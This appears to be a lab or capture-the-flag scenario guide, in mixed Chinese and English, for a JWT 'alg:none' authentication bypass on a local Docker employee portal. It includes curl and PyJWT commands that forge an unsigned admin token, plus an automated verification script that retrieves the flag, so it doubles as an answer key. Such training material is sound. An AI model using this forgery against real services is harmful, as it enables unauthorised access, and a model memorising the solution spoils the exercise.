# WEB-15: JWT Algorithm None Attack

## 场景信息

| 字段 | 值 |
|---|---|
| ID | WEB-15 |
| 名称 | JWT Algorithm None Attack |
| 技术/CVE | JWT alg:none |
| 难度 | L2 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10115 |

## 场景概述
- 技术：JWT alg:none
- 难度：L2
- 交付方式：docker
- 入口端口：10115
## 攻击路径与利用步骤

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | JWT Algorithm Confusion (alg:none) |
| Difficulty | L2 |
| Port | 10115 |
| Path | scenarios/web/jwt-none-algorithm/ |
| Type | docker |
| Service | Company Employee Portal |

### Attack Path Summary
```
Login as guest → Get JWT token → Forge JWT with alg:none + admin role → Access admin endpoint → Flag
```

### Prerequisites

#### Knowledge
- JWT结构 (JWT structure): Understanding the header.payload.signature format
- alg:none攻击 (alg:none attack): Exploiting JWT libraries that accept the "none" algorithm for authentication bypass
- Base64编码 (Base64 encoding): Encoding and decoding JWT payload segments
- token伪造 (Token forgery): Crafting manipulated JWT tokens with altered claims

#### Tools
- curl: Send HTTP requests for login and admin access
- Python3 PyJWT: Programmatically forge JWT tokens with algorithm manipulation
- jwt.io: Online JWT debugger for decoding and crafting tokens

### Step-by-Step Exploitation

#### Step 1: Access the Employee Portal

Open the portal and explore the available endpoints.

```bash
curl http://localhost:10115/
```

#### Step 2: Login as Guest

Obtain a legitimate JWT token by authenticating with guest credentials.

```bash
curl -X POST http://localhost:10115/login \
  -H "Content-Type: application/json" \
  -d '{"username":"guest","password":"guest123"}'
```

#### Step 3: Decode the Token

Base64-decode the payload segment to understand the token structure and claim names.

```bash
# Decode the JWT payload (second dot-separated segment)
echo "<payload_segment>" | base64 -d 2>/dev/null
```

Expected structure: `{"username":"guest","role":"user"}`

#### Step 4: Forge an Admin Token

Create a new JWT with `alg: none` (no signature) and admin-level claims.

```bash
python3 -c "
import jwt
token = jwt.encode({'username':'admin','role':'admin'}, '', algorithm='none')
print(token)
"
```

#### Step 5: Access the Admin Endpoint

Use the forged token to access the admin dashboard.

```bash
curl http://localhost:10115/admin \
  -H "Authorization: Bearer <FORGED_TOKEN>"
```

The flag is returned in the admin dashboard response.

### Flag Location
- Set as the `FLAG` environment variable in the container

### Verification Commands
```bash
python3 -c "
import jwt, requests
token = jwt.encode({'username':'admin','role':'admin'}, '', algorithm='none')
r = requests.get('http://localhost:10115/admin', headers={'Authorization': f'Bearer {token}'})
print(r.text)
" | grep -o 'flag{[^}]*}'
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | JWT-protected HTTP API |
| 侦察与前置条件 | Token header/claim handling and authorization boundary |
| 核心漏洞与利用 | Create an unsigned alg:none JWT accepted by the service |
| 权限、横向或影响 | Authenticated API access without a valid signature |
| 验证 | Call the protected endpoint and capture the flag |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
